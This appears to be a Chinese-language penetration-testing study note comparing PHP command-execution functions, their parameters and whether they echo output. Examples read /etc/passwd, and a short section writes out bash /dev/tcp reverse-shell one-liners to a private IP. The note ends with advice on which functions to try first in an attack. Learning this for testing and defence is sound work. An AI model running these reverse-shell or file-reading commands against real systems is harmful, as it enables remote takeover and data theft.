```text学习目标
1. ；了解函数运行
2. ：知道运行条件
3. ：参数
4. ：能否回显
```
# system

**函数运行**：执行外部程序并显示原始输出  
**运行条件**：基本PHP环境，无特殊要求  
**参数**：`system(string $command, int &$return_var = ?)`

- `$command`: 要执行的命令

- `&$return_var`: 可选，命令执行后的状态码  
```bash
常见状态码(可自定义)：
- **0**: 成功执行
    
- **1**: 一般错误
    
- **2**: 错误用法
    
- **126**: 命令不可执行
    
- **127**: 命令未找到
    
- **128+n**: 被信号n终止
  
system("ls /nonexistent", $code);
echo "状态码: $code\n";  // 可能输出 2（目录不存在）

system("cat /etc/passwd", $code);
echo "状态码: $code\n";  // 输出 0（成功）

system("invalid_cmd", $code);
echo "状态码: $code\n";  // 输出 127（命令不存在）

```
**能否回显**：✅ **能直接回显**，输出命令的所有执行结果
```bash
system("whoami");  // 执行系统命令并直接输出结果
```
# exec
**函数运行**：执行外部程序  
**运行条件**：基本PHP环境，无特殊要求  
**参数**：`exec(string $command, array &$output = ?, int &$return_var = ?)`

- `$command`: 要执行的命令
    
- `&$output`: 可选，存储命令输出的数组
    
- `&$return_var`: 可选，命令执行后的状态码  
**能否回显**：❌ **不能直接回显**，默认只返回最后一行
```bash
exec("ls -l", $output);
print_r($output);  // 需要手动输出
# 输出Array ( [0] => 10794 [1] => bin [2] => boot [3] => dev [4] => etc [5] => flag [6] => home [7] => lib [8] => lib64 [9] => media [10] => mnt [11] => opt [12] => proc [13] => root [14] => run [15] => sbin [16] => srv [17] => sys [18] => tmp [19] => usr [20] => var [21] => www )

echo exec("ls -l")只会输出最后一行，不会像前面print_r那样全部输出出来
```
# passthru
**函数运行**：执行外部程序并显示原始输出  
**运行条件**：基本PHP环境，无特殊要求  
**参数**：`passthru(string $command, int &$return_var = ?)`

- `$command`: 要执行的命令
    
- `&$return_var`: 可选，命令执行后的状态码  
**能否回显**：✅ **能直接回显**，输出二进制原始数据(==自己目前能接触的层面上，其实和system函数区别不大==)
```bash
passthru("cat /etc/passwd");  // 直接输出文件内容
# 输出This is test!!!root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin www:x:1000:1000::/home/www:/bin/sh systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin messagebus:x:103:105::/nonexistent:/usr/sbin/nologin sshd:x:104:65534::/run/sshd:/usr/sbin/nologin smmta:x:105:106:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin smmsp:x:106:107:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
```
# shell_exec
**函数运行**：通过shell环境执行命令  
**运行条件**：基本PHP环境，无特殊要求  
**参数**：`shell_exec(string $command)`

- `$command`: 要执行的命令  
**能否回显**：❌ **不能直接回显**，需要赋值给变量后输出
```bash
$result = shell_exec("pwd");
echo $result;  // 需要手动输出
# 输出/www/admin/localhost_80/wwwroot/class01
```
# popen
**函数运行**：打开进程文件指针  
**运行条件**：基本PHP环境，无特殊要求  
**参数**：`popen(string $command, string $mode)`

- `$command`: 要执行的命令
    
- `$mode`: 打开模式 ('r' 读取 / 'w' 写入)  
**能否回显**：❌ **不能直接回显**，需要读取文件指针
```bash
//popen 打开进程管道
$handle = popen("whoami", "r");
echo fread($handle, 1024);  // 需要手动读取输出 $handle是popen返回的句柄1024是最大读取长度
pclose($handle);// pclose() - 关闭管道
```
# proc_open
**函数运行**：执行命令并打开输入/输出文件指针  
**运行条件**：基本PHP环境，无特殊要求  
**参数**：`proc_open(string $command, array $descriptorspec, array &$pipes)`

- `$command`: 要执行的命令
    
- `$descriptorspec`: 文件描述符规范
    
- `&$pipes`: 文件指针数组  
**能否回显**：❌ **不能直接回显**，需要复杂的管道操作
```bash
<?php  
$descriptors = [  
    0 => ["pipe", "r"], // 标准输入  
    1 => ["pipe", "w"], // 标准输出  
    2 => ["pipe", "w"]  // 标准错误  
];  # $descriptors相对固定，使用时把这个照搬也可以
  
$process = proc_open("dir", $descriptors, $pipes);  
  
if (is_resource($process)) {  
    // 重要：关闭输入管道，否则进程可能等待输入  
    fclose($pipes[0]);  
  
    // 读取标准输出  
    $output = stream_get_contents($pipes[1]);  
    fclose($pipes[1]);  
  
    // 读取标准错误（可选）  
    $errors = stream_get_contents($pipes[2]);  
    fclose($pipes[2]);  
  
    // 关闭进程并获取退出码  
    $return_value = proc_close($process);  
  
    echo "输出: " . $output . PHP_EOL;  
    if (!empty($errors)) {  
        echo "错误: " . $errors . PHP_EOL;  
    }  
    echo "退出码: " . $return_value . PHP_EOL;  
} else {  
    echo "无法创建进程" . PHP_EOL;  
}  
?>
```
# \`\`
**函数运行**：执行shell命令并返回输出  
**运行条件**：基本PHP环境，无特殊要求  
**参数**：`$output =`command``

- `command`: 要执行的shell命令  
**能否回显**：❌ **不能直接回显**，需要赋值给变量后输出
```bash
$result = `id`;
echo $result;  // 需要手动输出
```
# pcntl_exec
**函数运行**：在当前进程空间执行指定程序  
**运行条件**：**需要安装pcntl扩展**（默认不安装）  
**参数**：`pcntl_exec(string $path, array $args = ?, array $envs = ?)`

- `$path`: 可执行文件路径
    
- `$args`: 参数数组
    
- `$envs`: 环境变量数组  
**能否回显**：❌ **不能直接回显**，且执行后当前PHP进程会终止
```bash
pcntl_exec("/bin/bash", ["-c", "whoami"]);  // 进程被替换，无回显
```
### 常见命令对比表

| 命令类型     | system()/exec()       | pcntl_exec()                                        |
| -------- | --------------------- | --------------------------------------------------- |
| **系统信息** | `uname -a`            | `pcntl_exec("/bin/uname", ["-a"])`                  |
| **用户信息** | `id`                  | `pcntl_exec("/usr/bin/id")`                         |
| **目录列表** | `ls -la`              | `pcntl_exec("/bin/ls", ["-la"])`                    |
| **文件查看** | `cat /etc/passwd`     | `pcntl_exec("/bin/cat", ["/etc/passwd"])`           |
| **网络检测** | `ping -c 1 127.0.0.1` | `pcntl_exec("/bin/ping", ["-c", "1", "127.0.0.1"])` |

### Linux 系统常见二进制路径：
```bash
// 系统命令
pcntl_exec("/bin/ls", ["-la"]);
pcntl_exec("/bin/cat", ["/etc/passwd"]);
pcntl_exec("/bin/ps", ["aux"]);
pcntl_exec("/usr/bin/whoami");
pcntl_exec("/bin/pwd");
pcntl_exec("/bin/hostname");

// 网络工具
pcntl_exec("/bin/ping", ["-c", "3", "google.com"]);
pcntl_exec("/bin/netstat", ["-tulpn"]);
pcntl_exec("/usr/bin/wget", ["http://example.com/file"]);

// 文本处理
pcntl_exec("/bin/grep", ["root", "/etc/passwd"]);
pcntl_exec("/usr/bin/head", ["-10", "/var/log/auth.log"]);
```

### 通过 shell 执行复杂命令：
```bash
// 使用 sh/bash 解释复杂命令
pcntl_exec("/bin/sh", ["-c", "ls -la | grep php"]);
pcntl_exec("/bin/bash", ["-c", "cat /etc/passwd | cut -d: -f1"]);

// 执行多条命令
pcntl_exec("/bin/bash", ["-c", "whoami; pwd; id"]);
```
### 反弹shell
```bash
// system() 方式
system("bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'");

// pcntl_exec() 方式
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"]);
```
# 总结对比

| 函数         | 直接回显 | 需要条件    | 使用难度 |
| ---------- | ---- | ------- | ---- |
| system     | ✅    | 无       | 简单   |
| 反引号        | ❌    | 无       | 简单   |
| exec       | ❌    | 无       | 简单   |
| passthru   | ✅    | 无       | 简单   |
| shell_exec | ❌    | 无       | 简单   |
| popen      | ❌    | 无       | 中等   |
| proc_open  | ❌    | 无       | 复杂   |
| pcntl_exec | ❌    | pcntl扩展 | 复杂   |

**渗透测试建议**：

- 优先尝试 `system()` 和 `passthru()`（直接回显）
    
- 其次尝试反引号、`exec()`、`shell_exec()`（需要输出变量）
    
- 复杂场景考虑 `popen()` 和 `proc_open()`
    
- `pcntl_exec()` 通常不可用